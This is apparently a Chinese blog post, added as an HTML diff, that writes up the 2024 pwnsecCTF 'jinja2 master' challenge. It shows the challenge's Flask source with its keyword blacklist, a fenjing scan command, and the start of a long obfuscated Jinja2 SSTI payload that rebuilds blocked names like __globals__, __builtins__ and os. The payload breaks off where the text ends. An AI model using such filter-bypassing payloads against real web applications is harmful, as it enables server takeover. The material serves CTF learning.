@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XU17">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSTI-fenjing-思路总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI-fenjing-思路总结">
+<meta property="og:url" content="http://example.com/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="XU17">
+<meta property="og:description" content="SSTI-fenjing-思路总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200035131.png">
+<meta property="article:published_time" content="2024-12-20T09:20:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T10:06:39.562Z">
+<meta property="article:author" content="XU17">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200035131.png">
+  
+  
+  
+  <title>SSTI-fenjing-思路总结 - XU17</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XU17&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200035131.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSTI-fenjing-思路总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-20 17:20" pubdate>
+          2024年12月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSTI-fenjing-思路总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSTI-fenjing-思路总结"><a href="#SSTI-fenjing-思路总结" class="headerlink" title="SSTI-fenjing-思路总结"></a>SSTI-fenjing-思路总结</h1><h3 id="2024-pwnsecCTF-jinjia2-master"><a href="#2024-pwnsecCTF-jinjia2-master" class="headerlink" title="2024-pwnsecCTF-jinjia2 master"></a>2024-pwnsecCTF-jinjia2 master</h3><ul>
+<li>SSTI模版注入，app.py源码如下</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br>BLACKLIST = [<br>    <span class="hljs-string">&#x27;init&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;TemplateReference&#x27;</span>,<br>    <span class="hljs-string">&#x27;cycler&#x27;</span>,<span class="hljs-string">&#x27;joiner&#x27;</span>,<span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;for&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;flashed&#x27;</span>,<span class="hljs-string">&#x27;range&#x27;</span>,<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>,<br>    <span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;pyfile&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;stdout&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;module&#x27;</span>,<span class="hljs-string">&#x27;RUNCMD&#x27;</span>,<span class="hljs-string">&#x27;format&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<br>    <span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;headers&#x27;</span>,<span class="hljs-string">&#x27;pragma&#x27;</span>,<span class="hljs-string">&#x27;mimetype&#x27;</span>,<span class="hljs-string">&#x27;origin&#x27;</span>,<span class="hljs-string">&#x27;referrer&#x27;</span>,<span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>,<span class="hljs-string">&#x27;free&#x27;</span>,<span class="hljs-string">&#x27;palestine&#x27;</span>,<span class="hljs-string">&#x27;with&#x27;</span><br>]<br><br>BLACKLIST += [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br><br>BLACKLIST += [<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    c = request.form.get(<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    error_message = <span class="hljs-literal">None</span><br>    rendered_template = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-keyword">if</span> c:<br>        c = c.lower()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> BLACKLIST:<br>            <span class="hljs-keyword">if</span> item <span class="hljs-keyword">in</span> c:<br>                error_message = <span class="hljs-string">&quot;Invalid input detected!&quot;</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            rendered_template = html.unescape(render_template_string(c))<br>            <span class="hljs-comment"># can you?</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fr3e_p4le$t1ne&amp;!&quot;</span> <span class="hljs-keyword">in</span> rendered_template:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> flag_file:<br>                        flag = flag_file.read()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span><br>                <span class="hljs-keyword">except</span> FileNotFoundError:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Flag file not found!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Jinja-Master&lt;/title&gt;</span><br><span class="hljs-string">    &lt;style&gt;</span><br><span class="hljs-string">        @import url(&#x27;https://fonts.googleapis.com/css2?family=VT323&amp;display=swap&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        body &#123;</span><br><span class="hljs-string">            display: flex;</span><br><span class="hljs-string">            justify-content: center;</span><br><span class="hljs-string">            align-items: center;</span><br><span class="hljs-string">            height: 100vh;</span><br><span class="hljs-string">            margin: 0;</span><br><span class="hljs-string">            background-image: url(&#x27;/static/image.jpg&#x27;);</span><br><span class="hljs-string">            background-size: cover;</span><br><span class="hljs-string">            background-position: center;</span><br><span class="hljs-string">            font-family: &#x27;VT323&#x27;, monospace;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container &#123;</span><br><span class="hljs-string">            background-color: rgba(0, 0, 0, 0.7);</span><br><span class="hljs-string">            padding: 20px;</span><br><span class="hljs-string">            border-radius: 10px;</span><br><span class="hljs-string">            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);</span><br><span class="hljs-string">            max-width: 400px; </span><br><span class="hljs-string">            width: 100%; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;text&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            margin: 10px 0;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            background-color: #33FF33;</span><br><span class="hljs-string">            border: none;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            color: #000;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            cursor: pointer;</span><br><span class="hljs-string">            transition: background-color 0.3s ease;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="hljs-string">            background-color: #00FF00;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .result, .error &#123;</span><br><span class="hljs-string">            margin-top: 20px;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            text-align: center;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &lt;/style&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;form-container&quot;&gt;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            Enter template string: &lt;input type=&quot;text&quot; name=&quot;c&quot;&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        </span><br><span class="hljs-string">        &lt;div class=&quot;result&quot;&gt;&#123;&#123; rendered_template &#125;&#125;&#123;&#123; error_message &#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&quot;&#123;&#123; error_message &#125;&#125;&quot;</span>, error_message <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>题目无回显，需要修改源码，本地调试</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">.replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;% if error_message %&#125;&quot;</span>, error_message <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;&lt;div class=&#x27;error&#x27;&gt;&quot;</span> + error_message + <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python -m flask <span class="hljs-built_in">run</span> <span class="hljs-attribute">--host</span>=0.0.0.0 <span class="hljs-attribute">--port</span>=1520<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200027251.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<ul>
+<li>fenjing一把嗦</li>
+</ul>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:1520&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;c=1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">c=&#123;%<span class="hljs-built_in">set</span> at=<span class="hljs-built_in">dict</span>(rtta=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> xq=<span class="hljs-built_in">dict</span>(so=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> re=<span class="hljs-built_in">dict</span>(daer=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> yd=<span class="hljs-built_in">dict</span>(a=x,b=x,c=x)|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span>=<span class="hljs-built_in">dict</span>(tini=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+<span class="hljs-keyword">in</span>+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> gl=<span class="hljs-built_in">dict</span>(slabolg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> ge=<span class="hljs-built_in">dict</span>(metiteg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> bu=<span class="hljs-built_in">dict</span>(snitliub=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> im=<span class="hljs-built_in">dict</span>(tropmi=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> yt=<span class="hljs-built_in">dict</span>(aaaaa=x)|first|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> pw=yd+la%&#125;&#123;%<span class="hljs-built_in">set</span> iw=&#123;&#125;|escape|<span class="hljs-built_in">list</span>|escape|count%&#125;&#123;%<span class="hljs-built_in">set</span> et=iw+lla%&#125;&#123;%<span class="hljs-built_in">set</span> po=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%&#125;&#123;%<span class="hljs-built_in">set</span> 